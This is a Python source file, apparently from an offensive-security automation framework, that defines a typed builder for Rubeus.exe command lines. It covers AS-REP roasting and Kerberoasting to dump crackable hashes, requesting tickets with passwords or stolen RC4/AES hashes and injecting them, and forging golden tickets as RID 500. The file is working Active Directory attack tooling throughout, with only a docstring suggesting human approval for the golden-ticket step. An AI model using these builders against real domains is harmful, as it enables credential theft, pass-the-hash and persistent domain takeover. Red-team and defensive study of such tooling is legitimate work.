from __future__ import annotations

from pydantic import SecretStr

from cadre_strike.builders._auth import secret_value


class RubeusBuilder:
    """Typed Rubeus.exe argv builder (Windows Kerberos)."""

    def __init__(self, binary: str = "Rubeus.exe") -> None:
        self.binary = binary

    def asreproast(
        self,
        *,
        user: str | None = None,
        domain: str | None = None,
        dc: str | None = None,
        format: str = "hashcat",
        outfile: str | None = None,
    ) -> list[str]:
        argv = [self.binary, "asreproast", "/format:" + format]
        if user:
            argv.append(f"/user:{user}")
        if domain:
            argv.append(f"/domain:{domain}")
        if dc:
            argv.append(f"/dc:{dc}")
        if outfile:
            argv.append(f"/outfile:{outfile}")
        return argv

    def kerberoast(
        self,
        *,
        spn: str | None = None,
        user: str | None = None,
        domain: str | None = None,
        dc: str | None = None,
        outfile: str | None = None,
        tgtdeleg: bool = False,
    ) -> list[str]:
        argv = [self.binary, "kerberoast"]
        if spn:
            argv.append(f"/spn:{spn}")
        if user:
            argv.append(f"/user:{user}")
        if domain:
            argv.append(f"/domain:{domain}")
        if dc:
            argv.append(f"/dc:{dc}")
        if outfile:
            argv.append(f"/outfile:{outfile}")
        if tgtdeleg:
            argv.append("/tgtdeleg")
        return argv

    def asktgt(
        self,
        *,
        user: str,
        domain: str,
        password: str | SecretStr | None = None,
        rc4: str | SecretStr | None = None,
        aes256: str | SecretStr | None = None,
        dc: str | None = None,
        ptt: bool = False,
    ) -> list[str]:
        argv = [self.binary, "asktgt", f"/user:{user}", f"/domain:{domain}"]
        pw = secret_value(password)
        h_rc4 = secret_value(rc4)
        h_aes = secret_value(aes256)
        if pw:
            argv.append(f"/password:{pw}")
        if h_rc4:
            argv.append(f"/rc4:{h_rc4}")
        if h_aes:
            argv.append(f"/aes256:{h_aes}")
        if dc:
            argv.append(f"/dc:{dc}")
        if ptt:
            argv.append("/ptt")
        if not any([pw, h_rc4, h_aes]):
            raise ValueError("asktgt requires password, rc4, or aes256")
        return argv

    def golden(
        self,
        *,
        user: str,
        domain: str,
        sid: str,
        rc4: str | SecretStr,
        id: int = 500,
        ptt: bool = False,
    ) -> list[str]:
        """High-risk — caller should gate via HITL before execute."""
        argv = [
            self.binary,
            "golden",
            f"/user:{user}",
            f"/domain:{domain}",
            f"/sid:{sid}",
            f"/rc4:{secret_value(rc4)}",
            f"/id:{id}",
        ]
        if ptt:
            argv.append("/ptt")
        return argv
